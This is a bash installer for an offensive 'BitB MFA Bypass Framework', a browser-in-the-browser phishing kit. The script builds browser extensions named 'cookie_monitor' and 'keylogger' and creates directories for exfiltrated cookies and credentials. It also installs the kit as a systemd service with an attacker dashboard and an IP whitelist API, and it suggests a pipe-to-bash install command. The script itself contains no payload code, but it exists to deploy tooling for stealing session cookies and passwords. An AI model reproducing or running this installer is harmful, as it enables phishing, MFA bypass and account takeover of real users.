#!/usr/bin/env bash
#
# BitB Framework v2.1 — Installation Script
# Run: sudo bash install.sh
#

set -euo pipefail

BOLD='\033[1m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║        BitB MFA Bypass Framework v2.1 — Installation       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ─── Check Root ─────────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}❌ This script must be run as root${NC}"
    echo "   sudo bash install.sh"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ─── Check Python ───────────────────────────────────────────────────────────
echo -e "${YELLOW}[1/6]${NC} ${BOLD}Checking Python version...${NC}"
if command -v python3 &>/dev/null; then
    PYTHON=python3
elif command -v python &>/dev/null; then
    PYTHON=python
else
    echo -e "${RED}❌ Python 3 not found. Install it: sudo apt-get install python3 python3-pip${NC}"
    exit 1
fi

PY_VERSION=$($PYTHON --version 2>&1 | awk '{print $2}')
echo "   ✅ Python $PY_VERSION found"

# ─── Check Docker ───────────────────────────────────────────────────────────
echo -e "${YELLOW}[2/6]${NC} ${BOLD}Checking Docker...${NC}"
if command -v docker &>/dev/null; then
    echo "   ✅ Docker found: $(docker --version)"
    
    # Check if docker daemon is running
    if ! docker info &>/dev/null; then
        echo -e "${YELLOW}   ⚠️  Docker daemon not running. Starting...${NC}"
        systemctl start docker
        sleep 2
    fi
    
    # Pull Firefox image
    echo "   📥 Pulling jlesage/firefox image..."
    docker pull jlesage/firefox:latest &>/dev/null
    echo "   ✅ Firefox image ready"
else
    echo -e "${RED}❌ Docker not found. Install it: curl -fsSL https://get.docker.com | bash${NC}"
    exit 1
fi

# ─── Install Python Dependencies ────────────────────────────────────────────
echo -e "${YELLOW}[3/6]${NC} ${BOLD}Installing Python dependencies...${NC}"
$PYTHON -m pip install --upgrade pip -q
$PYTHON -m pip install -r requirements.txt -q
echo "   ✅ Dependencies installed"

# ─── Build Extensions ──────────────────────────────────────────────────────
echo -e "${YELLOW}[4/6]${NC} ${BOLD}Building browser extensions...${NC}"
cd extensions
if command -v make &>/dev/null; then
    make clean 2>/dev/null || true
    make
else
    # Fallback: build with python zip
    $PYTHON -c "
import zipfile, pathlib
build_dir = pathlib.Path('build')
build_dir.mkdir(exist_ok=True)
for ext in ['cookie_monitor', 'keylogger']:
    ext_dir = pathlib.Path(ext)
    if ext_dir.exists():
        xpi_path = build_dir / f'{ext}.xpi'
        with zipfile.ZipFile(xpi_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in ext_dir.rglob('*'):
                if f.is_file():
                    zf.write(f, str(f.relative_to(ext_dir)))
        print(f'  ✅ Built {xpi_path}')
"
fi
cd ..
echo "   ✅ Extensions built"

# ─── Create Data Directories ────────────────────────────────────────────────
echo -e "${YELLOW}[5/6]${NC} ${BOLD}Creating data directories...${NC}"
mkdir -p /data/bitb/access_control
mkdir -p /data/sessions
mkdir -p /data/exfiltrated/extensions/cookies
mkdir -p /data/exfiltrated/extensions/credentials
mkdir -p /var/log/bitb
echo "   ✅ Directories created"

# ─── Install Systemd Service ────────────────────────────────────────────────
echo -e "${YELLOW}[6/6]${NC} ${BOLD}Installing systemd service...${NC}"
$PYTHON bitb.py --install
echo "   ✅ Systemd service installed"

# ─── Create /usr/local/bin symlink ─────────────────────────────────────────
if [[ ! -L /usr/local/bin/bitb ]]; then
    ln -sf "$(pwd)/bitb.py" /usr/local/bin/bitb
    echo "   ✅ Symlink: /usr/local/bin/bitb -> $(pwd)/bitb.py"
fi

# ─── Done ───────────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║              ✅ Installation Complete!                      ║${NC}"
echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BOLD}Start the service:${NC}"
echo "    sudo systemctl enable bitb    # Auto-start on boot"
echo "    sudo systemctl start bitb     # Start now"
echo ""
echo -e "  ${BOLD}Check status:${NC}"
echo "    sudo systemctl status bitb"
echo "    sudo journalctl -u bitb -f    # Watch logs"
echo ""
echo -e "  ${BOLD}Run in foreground:${NC}"
echo "    sudo python3 bitb.py"
echo ""
echo -e "  ${BOLD}Dashboard:${NC}"
echo "    http://localhost:8080"
echo ""
echo -e "  ${BOLD}Commands:${NC}"
echo "    sudo bitb --status            # Quick status"
echo "    sudo bitb --install           # (Re)install service"
echo "    sudo bitb --uninstall         # Remove service"
echo ""
echo -e "  ${BOLD}Access Control:${NC}"
echo "    Add IP to whitelist:  curl -X POST http://localhost:8080/api/access/whitelist -H 'Content-Type: application/json' -d '{\"ip\":\"10.0.0.0/8\"}'"
echo "    Check session access: curl -X POST http://localhost:8080/api/access/session/<id>/check -d '{\"ip\":\"1.2.3.4\"}'"
echo ""
